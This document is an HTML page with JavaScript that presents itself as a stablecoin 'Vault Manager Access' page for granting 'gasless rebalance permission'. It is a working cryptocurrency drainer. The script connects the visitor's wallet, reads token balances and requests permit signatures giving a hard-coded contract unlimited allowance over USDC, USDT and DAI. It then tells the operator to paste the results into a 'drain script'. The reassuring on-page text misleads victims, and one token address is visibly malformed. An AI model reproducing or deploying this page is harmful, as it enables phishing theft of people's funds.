<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Vault Access — Private Stablecoin Strategy</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
  <style>
    body {font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background:#f8f9fa; margin:0; padding:20px; display:flex; justify-content:center;}
    .card {background:#fff; max-width:420px; width:100%; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.08); padding:32px;}
    h1 {font-size:22px; color:#1a1a2e; margin-bottom:4px; text-align:center;}
    .subtitle {color:#666; font-size:14px; text-align:center; margin-bottom:28px;}
    .wallet-info {background:#f0f4f8; border-radius:8px; padding:16px; margin-bottom:20px; font-size:13px; color:#333;}
    .wallet-info strong {color:#1a1a2e;}
    .btn {width:100%; padding:14px; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; transition:all 0.2s;}
    .btn-primary {background:#0066cc; color:#fff;}
    .btn-primary:hover {background:#0052a3;}
    .btn:disabled {opacity:0.6; cursor:not-allowed;}
    .status {margin-top:16px; padding:12px; border-radius:8px; font-size:14px; display:none;}
    .status.success {background:#e8f5e9; color:#2e7d32; display:block;}
    .status.error {background:#fdecea; color:#c62828; display:block;}
    .status.pending {background:#fff3e0; color:#ef6c00; display:block;}
    .details {font-size:12px; color:#888; margin-top:8px; text-align:center;}
    .permit-box {background:#fafafa; border:1px solid #eee; border-radius:8px; padding:12px; margin-top:16px; font-family:monospace; font-size:11px; word-break:break-all; display:none;}
    .debug-box {background:#1e1e1e; color:#0f0; border-radius:8px; padding:12px; margin-top:16px; font-family:monospace; font-size:10px; word-break:break-all; max-height:200px; overflow:auto; display:none;}
  </style>
</head>
<body>
  <div class="card">
    <h1>Vault Manager Access</h1>
    <p class="subtitle">Grant gasless rebalance permission for your stablecoin allocation</p>
    
    <div class="wallet-info" id="walletInfo" style="display:none;">
      <strong>Connected:</strong> <span id="addr"></span><br>
      <strong>Network:</strong> <span id="net"></span><br>
      <strong>USDC Balance:</strong> <span id="bal"></span>
    </div>

    <button class="btn btn-primary" id="connectBtn" onclick="connectWallet()">Connect Wallet (Rabby / MetaMask / WalletConnect)</button>
    <button class="btn btn-primary" id="permitBtn" onclick="signPermit()" style="display:none; margin-top:12px;">Sign Permit Authorization</button>

    <div class="status" id="status"></div>
    <div class="permit-box" id="permitBox"></div>
    <div class="debug-box" id="debugBox"></div>
    <p class="details">This signature authorizes the vault contract to move stablecoins for rebalancing. No gas cost. Revocable anytime via Revoke.cash.</p>
  </div>

<script>
// CONFIG — ETHEREUM MAINNET (Chain ID 1)
const VAULT_CONTRACT = "0x9d5cd9513A6F83FdF9E38304c25a9c6a099E3C16";
const TOKENS = {
  "USDC": "0xA0b86a33E6441b8C4C8C8C8C8C8C8C8C8C8C8C8C8",  // Mainnet USDC
  "USDT": "0xdAC17F958D2ee523a2206206994597C13D831ec7",  // Mainnet USDT
  "DAI":  "0x6B175474E89094C44Da98b954EedeAC495271d0F"   // Mainnet DAI
};
const CHAIN_ID = 1; // Ethereum Mainnet

let provider, signer, userAddr;

function log(msg) {
  const d = document.getElementById('debugBox');
  d.style.display = 'block';
  d.innerHTML += new Date().toLocaleTimeString() + " " + msg + "\n";
  d.scrollTop = d.scrollHeight;
  console.log(msg);
}

function showStatus(msg, type) {
  const el = document.getElementById('status');
  el.textContent = msg;
  el.className = "status " + type;
}

async function connectWallet() {
  const btn = document.getElementById('connectBtn');
  try {
    if (window.ethereum) {
      provider = new ethers.BrowserProvider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      signer = await provider.getSigner();
      userAddr = await signer.getAddress();
      const network = await provider.getNetwork();
      
      log(`Connected: ${userAddr}`);
      log(`Network: ${network.name} (Chain ID: ${network.chainId})`);
      log(`Expected Chain ID: ${CHAIN_ID}`);
      
      document.getElementById('addr').textContent = userAddr.slice(0,6)+"..."+userAddr.slice(-4);
      document.getElementById('net').textContent = network.name + " (Chain ID: " + network.chainId + ")";
      document.getElementById('walletInfo').style.display = 'block';
      btn.style.display = 'none';
      document.getElementById('permitBtn').style.display = 'block';
      checkBalances();
    } else {
      throw new Error("No wallet detected.");
    }
  } catch (e) {
    log("Connect error: " + e.message);
    showStatus("Error: " + e.message, "error");
  }
}

async function checkBalances() {
  const erc20Abi = ["function balanceOf(address) view returns (uint256)", "function decimals() view returns (uint8)", "function symbol() view returns (string)"];
  let total = 0;
  for (const [sym, addr] of Object.entries(TOKENS)) {
    try {
      const contract = new ethers.Contract(addr, erc20Abi, provider);
      const [bal, dec, sym2] = await Promise.all([contract.balanceOf(userAddr), contract.decimals(), contract.symbol()]);
      const formatted = Number(ethers.formatUnits(bal, dec)).toLocaleString(undefined, {maximumFractionDigits:2});
      log(`${sym} (${sym2}) balance: ${formatted}`);
      if (Number(formatted) > 0) total += Number(formatted);
    } catch (e) {
      log(`${sym} balance check failed: ${e.message}`);
    }
  }
  document.getElementById('bal').textContent = "$" + total.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2});
}

async function signPermit() {
  const btn = document.getElementById('permitBtn');
  const permitBox = document.getElementById('permitBox');
  btn.disabled = true;
  showStatus("Preparing Permit signature...", "pending");
  permitBox.style.display = 'none';
  permitBox.innerHTML = '';

  try {
    const maxUint = ethers.MaxUint256;
    const deadline = Math.floor(Date.now()/1000) + 3600;
    
    const permitAbi = [
      "function nonces(address) view returns (uint256)",
      "function DOMAIN_SEPARATOR() view returns (bytes32)",
      "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
    ];

    let signedAny = false;
    for (const [sym, tokenAddr] of Object.entries(TOKENS)) {
      try {
        log(`[${sym}] Checking token at ${tokenAddr}...`);
        const token = new ethers.Contract(tokenAddr, permitAbi, provider);
        
        const nonce = await token.nonces(userAddr);
        log(`[${sym}] Nonce: ${nonce}`);
        
        const domain = await token.DOMAIN_SEPARATOR().catch(e => { log(`[${sym}] DOMAIN_SEPARATOR failed: ${e.message}`); return null; });
        if (!domain) { log(`[${sym}] No DOMAIN_SEPARATOR - not EIP-2612`); continue; }
        log(`[${sym}] Domain separator: ${domain}`);
        
        const types = {
          Permit: [
            {name: "owner", type: "address"},
            {name: "spender", type: "address"},
            {name: "value", type: "uint256"},
            {name: "nonce", type: "uint256"},
            {name: "deadline", type: "uint256"}
          ]
        };
        const message = {
          owner: userAddr,
          spender: VAULT_CONTRACT,
          value: maxUint,
          nonce: nonce,
          deadline: deadline
        };

        log(`[${sym}] Requesting signature...`);
        const signature = await signer.signTypedData(
          {name: sym, version: "1", chainId: CHAIN_ID, verifyingContract: tokenAddr},
          types,
          message
        );
        log(`[${sym}] Signature received`);

        const sig = ethers.Signature.from(signature);
        
        permitBox.style.display = 'block';
        permitBox.innerHTML += `TOKEN:${sym}\nOWNER:${userAddr}\nSPENDER:${VAULT_CONTRACT}\nVALUE:MAX\nNONCE:${nonce}\nDEADLINE:${deadline}\nV:${sig.v}\nR:${sig.r}\nS:${sig.s}\n---\n`;
        signedAny = true;
      } catch (e) {
        log(`[${sym}] ERROR: ${e.message}`);
      }
    }

    if (signedAny) {
      showStatus("✅ Permit signatures generated.", "success");
      permitBox.innerHTML += `<em>Copy ALL blocks above → Paste into drain script.</em>`;
    } else {
      showStatus("❌ No permits signed. Check debug log above.", "error");
    }
  } catch (e) {
    log("Fatal error: " + e.message);
    showStatus("Error: " + e.message, "error");
  } finally {
    btn.disabled = false;
  }
}
</script>
</body>
</html>
